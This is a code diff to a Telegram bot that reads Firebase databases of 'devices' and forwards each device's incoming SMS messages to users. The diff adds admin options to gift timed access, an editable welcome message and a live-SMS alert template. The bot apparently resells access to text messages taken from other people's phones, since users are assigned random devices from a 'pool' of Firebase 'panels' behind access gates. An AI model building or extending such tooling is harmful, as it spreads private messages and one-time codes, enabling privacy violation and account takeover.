@@ -8,7 +8,7 @@ import {
   setUserBanned, ensureSchema, registerReferral, qualifyReferral, getReferralStats,
   addFreeFirebasePanel, getFreeFirebasePanels, removeFreeFirebasePanel, claimFreeFirebase,
   getClaimedFreePanel, addRequiredChannel, getRequiredChannels, removeRequiredChannel,
-  getAccessStatus, grantTimedAccess
+  getAccessStatus, grantTimedAccess, grantTimedAccessToUsers, grantTimedAccessToAllUsers
 } from "./db.js";
 import { collectEvents, extractDevices, readFirebase, validateFirebaseUrl } from "./firebase.js";
 import { back, clearSession, getSession, pushScreen, setSession } from "./state.js";
@@ -20,10 +20,11 @@ import {
   adminReferralKeyboard, adminReferralText, adminFreePoolKeyboard, adminFreePoolText,
   adminChannelsKeyboard, adminChannelsText, adminContentKeyboard, adminContentPrompt,
   adminContentText, DEFAULT_HOW_TO_USE_MESSAGE, DEFAULT_MAINTENANCE_MESSAGE,
-  DEFAULT_REFERRAL_MESSAGE, adminAuditChannelKeyboard, adminAuditChannelText,
+  DEFAULT_REFERRAL_MESSAGE, DEFAULT_WELCOME_MESSAGE, adminAuditChannelKeyboard, adminAuditChannelText,
   adminImagesKeyboard, adminImagesText, premiumizeKeyboard,
   accessGateKeyboard, accessGateText, deviceDetailKeyboard, deviceDetailText,
-  lastSmsKeyboard, lastSmsText
+  lastSmsKeyboard, lastSmsText, liveSmsText, adminDashboardText,
+  adminGiftAccessText, adminGiftAccessKeyboard, adminGiftSpecificText, adminGiftSpecificKeyboard
 } from "./ui.js";
 import type { Device, DeviceSummary, RequiredChannel } from "./types.js";
 import { logger } from "../lib/logger.js";
@@ -144,13 +145,20 @@ async function guard(ctx: Context): Promise<boolean> {
 }
 
 async function editOrReply(ctx: Context, text: string, keyboard?: unknown) {
-  const styledKeyboard = premiumizeKeyboard(keyboard) as any;
   if ("callbackQuery" in ctx && ctx.callbackQuery) {
     try {
-      await ctx.editMessageText(text, styledKeyboard ? { reply_markup: styledKeyboard } : undefined);
+      await ctx.editMessageText(text, keyboard ? { reply_markup: keyboard as any } : undefined);
       return;
-    } catch { /* The message may be unchanged or no longer editable. */ }
+    } catch (error) {
+      // Do not create a second message after a button tap. A failed edit is
+      // usually a harmless no-op or an expired Telegram message.
+      if (!/message is not modified|message can't be edited|message to edit not found/i.test(shortError(error))) {
+        await logSystem("warn", "callback_message_edit_failed", shortError(error), userId(ctx));
+      }
+      return;
+    }
   }
+  const styledKeyboard = premiumizeKeyboard(keyboard) as any;
   await ctx.reply(text, styledKeyboard ? Markup.inlineKeyboard(styledKeyboard.inline_keyboard) : undefined);
 }
 
@@ -333,9 +341,10 @@ async function renderHome(ctx: Context, includeImage = false, refresh = true) {
   clearSession(id);
   const combined = aggregateHomeSources(connections, summaries, pool);
   const limit = Number(await getSetting("firebase_limit", "0"));
+  const welcomeMessage = await getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE);
   await editOrReplyWithConfiguredImage(
     ctx,
-    homeText({ connections: combined.sourceCount, devices: combined.devices }, limit),
+    homeText({ connections: combined.sourceCount, devices: combined.devices }, limit, welcomeMessage),
     homeKeyboard(admin(ctx)),
     includeImage ? IMAGE_SETTING_KEYS.welcome : undefined
   );
@@ -382,11 +391,12 @@ function startHomeMonitor(ctx: Context) {
       if (!monitor?.active || getSession(telegramId).screen !== "home") return;
       const combined = aggregateHomeSources(connections, summaries, poolSnapshot);
       const keyboard = premiumizeKeyboard(homeKeyboard(telegramId === config.ADMIN_TELEGRAM_ID)) as any;
+      const welcomeMessage = await getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE);
       await bot.telegram.editMessageText(
         chatId,
         messageId,
         undefined,
-        homeText({ connections: combined.sourceCount, devices: combined.devices }, Number(await getSetting("firebase_limit", "0"))),
+        homeText({ connections: combined.sourceCount, devices: combined.devices }, Number(await getSetting("firebase_limit", "0")), welcomeMessage),
         { reply_markup: keyboard }
       );
     } catch (error) {
@@ -616,14 +626,15 @@ async function renderAdminChannels(ctx: Context) {
 
 async function renderAdminContent(ctx: Context) {
   if (!admin(ctx)) return;
-  const [referralMessage, maintenanceMessage, howToUseMessage] = await Promise.all([
+  const [referralMessage, maintenanceMessage, howToUseMessage, welcomeMessage] = await Promise.all([
     getSetting("referral_message", DEFAULT_REFERRAL_MESSAGE),
     getSetting("maintenance_message", DEFAULT_MAINTENANCE_MESSAGE),
-    getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE)
+    getSetting("how_to_use_message", DEFAULT_HOW_TO_USE_MESSAGE),
+    getSetting("welcome_message", DEFAULT_WELCOME_MESSAGE)
   ]);
   await editOrReply(
     ctx,
-    adminContentText(referralMessage, maintenanceMessage, howToUseMessage),
+    adminContentText(referralMessage, maintenanceMessage, howToUseMessage, welcomeMessage),
     adminContentKeyboard()
   );
 }
@@ -895,7 +906,9 @@ type SelectedPoolDevice = {
 };
 
 async function selectRandomPoolDevice(telegramId: number): Promise<SelectedPoolDevice> {
-  const pool = await readPoolSources(true);
+  // The background pool loop keeps this cache warm. Do not make every button
+  // tap wait for a full Firebase scan; fall back to one scan only on cold start.
+  const pool = poolSnapshotCache?.value ?? await readPoolSources(false);
   if (!pool.configuredSources) throw new Error("Admin has not configured any active Firebase device sources.");
 
   const failures = pool.sources
@@ -1095,10 +1108,22 @@ bot.on("text", async (ctx, next) => {
     await renderAdminFreeAccess(ctx);
     return;
   }
+  if (session.awaiting === "gift_access_user" && admin(ctx)) {
+    const target = Number(ctx.message.text.trim());
+    if (!Number.isSafeInteger(target) || target <= 0) {
+      await ctx.reply("❌ Send a valid numeric Telegram user ID.");
+      return;
+    }
+    setSession(userId(ctx), { awaiting: undefined, giftAccessTargetId: target, screen: "admin_gift_access" });
+    const keyboard = premiumizeKeyboard(adminGiftSpecificKeyboard(target) as any) as any;
+    await ctx.reply(adminGiftSpecificText(target), Markup.inlineKeyboard(keyboard.inline_keyboard));
+    return;
+  }
   if (
     (session.awaiting === "referral_message" ||
       session.awaiting === "maintenance_message" ||
-      session.awaiting === "how_to_use_message") &&
+      session.awaiting === "how_to_use_message" ||
+      session.awaiting === "welcome_message") &&
     admin(ctx)
   ) {
     const value = ctx.message.text.trim().slice(0, 3900);
@@ -1110,12 +1135,16 @@ bot.on("text", async (ctx, next) => {
       ? "referral_message"
       : session.awaiting === "maintenance_message"
         ? "maintenance_message"
-        : "how_to_use_message";
+        : session.awaiting === "how_to_use_message"
+          ? "how_to_use_message"
+          : "welcome_message";
     const label = session.awaiting === "referral_message"
       ? "Referral"
       : session.awaiting === "maintenance_message"
         ? "Maintenance"
-        : "How to Use";
+        : session.awaiting === "how_to_use_message"
+          ? "How to Use"
+          : "Welcome";
     await setSetting(key, value);
     setSession(userId(ctx), { awaiting: undefined });
     await logSystem("info", "bot_content_changed", `${label} message updated`, userId(ctx));
@@ -1372,22 +1401,12 @@ async function renderAdmin(ctx: Context) {
   if (!admin(ctx)) return;
   const stats = await adminStats();
   const maintenanceEnabled = (await getSetting("maintenance_mode", "false")) === "true";
-  await editOrReply(ctx, [
-    "━━━━━━━━━━━━━━━━━━━━",
-    "👑 ADMIN DASHBOARD",
-    "━━━━━━━━━━━━━━━━━━━━",
-    "",
-    "SYSTEM OVERVIEW",
-    `👥 Users: ${stats?.users ?? 0}`,
-    `🔥 Firebase Connections: ${stats?.connections ?? 0}`,
-    `📱 Cached Devices: ${stats?.devices ?? 0}`,
-    `🟢 Online: ${stats?.online ?? 0}  ·  🔴 Offline: ${stats?.offline ?? 0}`,
-    "",
-    `🛠 Maintenance: ${maintenanceEnabled ? "ON" : "OFF"}`,
-    "",
-    "Choose a section below.",
-    "━━━━━━━━━━━━━━━━━━━━"
-  ].join("\n"), adminKeyboard(maintenanceEnabled));
+  const pool = cachedPoolSources() ?? await readPoolSources(false).catch(() => undefined);
+  const poolSummary = (pool?.sources ?? []).filter(source => source.ok || source.stale).reduce((total, source) => {
+    addSummary(total, summaryForDevices(source.devices));
+    return total;
+  }, { total: 0, online: 0, offline: 0 });
+  await editOrReply(ctx, adminDashboardText(stats, poolSummary, maintenanceEnabled), adminKeyboard(maintenanceEnabled));
 }
 
 async function renderAdminUsers(ctx: Context) {
@@ -1471,6 +1490,12 @@ bot.action("admin_content_how_to_use", async ctx => {
   await answerCallback(ctx);
   await editOrReply(ctx, adminContentPrompt("how_to_use"), navKeyboard("admin_content"));
 });
+bot.action("admin_content_welcome", async ctx => {
+  if (!(await guard(ctx)) || !admin(ctx)) return;
+  setSession(userId(ctx), { awaiting: "welcome_message", screen: "admin_content" });
+  await answerCallback(ctx);
+  await editOrReply(ctx, adminContentPrompt("welcome"), navKeyboard("admin_content"));
+});
 bot.action("admin_audit_channel", async ctx => {
   if (!(await guard(ctx)) || !admin(ctx)) return;
   await answerCallback(ctx);
@@ -1547,6 +1572,39 @@ bot.action("admin_access_duration_custom", async ctx => {
   setSession(userId(ctx), { awaiting: "access_duration", screen: "admin_free" });
   await answerCallback(ctx);
   await editOrReply(ctx, "⏱ CUSTOM ACCESS DURATION\n\nSend a whole number from 1 to 1440 minutes.\n\nSend /cancel to stop.", navKeyboard("admin_access_duration"));
+});
+bot.action("admin_gift_access", async ctx => {
+  if (!(await guard(ctx)) || !admin(ctx)) return;
+  setSession(userId(ctx), { screen: "admin_gift_access", giftAccessTargetId: undefined });
+  await answerCallback(ctx);
+  await editOrReply(ctx, adminGiftAccessText(), adminGiftAccessKeyboard());
+});
+bot.action("admin_gift_specific", async ctx => {
+  if (!(await guard(ctx)) || !admin(ctx)) return;
+  setSession(userId(ctx), { awaiting: "gift_access_user", screen: "admin_gift_access", giftAccessTargetId: undefined });
+  await answerCallback(ctx);
+  await editOrReply(ctx, adminGiftSpecificText(), navKeyboard("admin_gift_access"));
+});
+bot.action(/^admin_gift:all:(35|60)$/, async ctx => {
+  if (!(await guard(ctx)) || !admin(ctx)) return;
+  const duration = Number(ctx.match[1]);
+  const count = await grantTimedAccessToAllUsers(duration);
+  await logSystem("info", "admin_gift_access", `Granted ${duration} minutes to ${count} users`, userId(ctx));
+  await answerCallback(ctx, `${duration === 60 ? "1 hour" : `${duration} minutes`} gifted to ${count} users`);
+  await editOrReply(ctx, `✅ ${duration === 60 ? "1 hour" : `${duration} minutes`} access gifted to ${count} users.`, adminGiftAccessKeyboard());
+});
+bot.action(/^admin_gift:specific:(\d+):(35|60)$/, async ctx => {
+  if (!(await guard(ctx)) || !admin(ctx)) return;
+  const target = Number(ctx.match[1]);
+  const duration = Number(ctx.match[2]);
+  const count = await grantTimedAccessToUsers([target], duration);
+  if (!count) {
+    await answerCallback(ctx, "User ID not found.", { show_alert: true });
+    return;
+  }
+  await logSystem("info", "admin_gift_access", `Granted ${duration} minutes to user ${target}`, userId(ctx));
+  await answerCallback(ctx, `${duration === 60 ? "1 hour" : `${duration} minutes`} gifted`);
+  await editOrReply(ctx, `✅ ${duration === 60 ? "1 hour" : `${duration} minutes`} access gifted to ${target}.`, adminGiftAccessKeyboard());
 });
 bot.action("admin_free_pool", async ctx => { if (await guard(ctx) && admin(ctx)) { await answerCallback(ctx); await renderAdminFreePool(ctx); } });
 bot.action("admin_free_pool_add", async ctx => {
@@ -1725,7 +1783,7 @@ function startMonitor(
         if (!isActive()) return;
         await markEventSeen(telegramId, firebaseId, latest.normalizedDeviceId, event.id, event.fingerprint);
         if (!isActive()) return;
-        await bot.telegram.sendMessage(telegramId, `━━━━━━━━━━━━━━━━━━━━\n📩 NEW DEVICE MESSAGE\n━━━━━━━━━━━━━━━━━━━━\n\n📱 Device: ${latest.deviceId}\n🕒 Time: ${event.timestamp ?? new Date().toISOString()}\n\n💬 Message:\n${event.message}\n\n━━━━━━━━━━━━━━━━━━━━`);
+         await bot.telegram.sendMessage(telegramId, liveSmsText(latest, event.message, event.timestamp));
       }
     } catch (error) { await logSystem("error", "event_monitor_failed", error instanceof Error ? error.message : String(error), telegramId); }
   };
